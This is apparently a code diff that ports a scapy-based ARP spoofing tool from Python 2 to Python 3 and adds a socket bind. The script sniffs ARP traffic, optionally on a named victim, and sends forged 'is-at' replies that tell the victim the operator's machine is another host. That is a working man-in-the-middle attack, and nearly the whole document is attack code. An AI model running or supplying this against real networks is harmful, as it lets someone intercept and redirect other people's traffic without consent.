@@ -5,6 +5,7 @@ from scapy.all import sniff, sendp, ARP, Ether
 from time import *
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.bind((socket.gethostname(), 219))
 my_ip=s.getsockname()[0]
 s.close()
 class ARP_spoofing():
@@ -18,8 +19,8 @@ class ARP_spoofing():
 
     def arp_poison_callback(self, packet):
         if self.stop ==  True:
-            print "arp sooofing stoped"
-            exit(0);
+            print("arp sooofing stoped")
+            exit(0)
         router_ip=''
         # Got ARP request?
         answer = Ether(dst=packet[ARP].hwsrc) / ARP()
@@ -28,8 +29,8 @@ class ARP_spoofing():
             if  str(packet[ARP].psrc) !=str(self.victim) and str(packet[ARP].pdst) !=  str(self.victim):
                 return 0
 
-        print packet[ARP].psrc
-        print packet[ARP].pdst
+        print(packet[ARP].psrc)
+        print(packet[ARP].pdst)
         answer = Ether(dst=packet[ARP].hwsrc) / ARP()
         answer[ARP].op = "is-at"
         answer[ARP].hwdst = packet[ARP].hwsrc
@@ -37,21 +38,21 @@ class ARP_spoofing():
         answer[ARP].pdst = packet[ARP].psrc
         #router_ip=packet[ARP].pdst
         self.arp_spoof_msg="Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me"
-        print self.arp_spoof_msg
+        print(self.arp_spoof_msg)
         
         try:
             sendp(answer, iface=self.dev)
-        except Exception, e:
-            print "The following error occurred " + str(e)
+        except Exception as e:
+            print("The following error occurred " + str(e))
         
 
     def start_arp_spoofing(self, *args):
         self.dev=args[1]
         self.victim=args[0]
-        print "sniffing on "+ str (self.dev)
+        print("sniffing on "+ str (self.dev))
         if self.victim !='':
             sniff(prn=self.arp_poison_callback,filter="arp and host "+ self.victim,iface=self.dev,store=0)
-            print "victim is "+str(self.victim)
+            print("victim is "+str(self.victim))
         else:
             sniff(prn=self.arp_poison_callback,filter="arp",iface=self.dev, store=0)
-            print "no victim supplied"
+            print("no victim supplied")
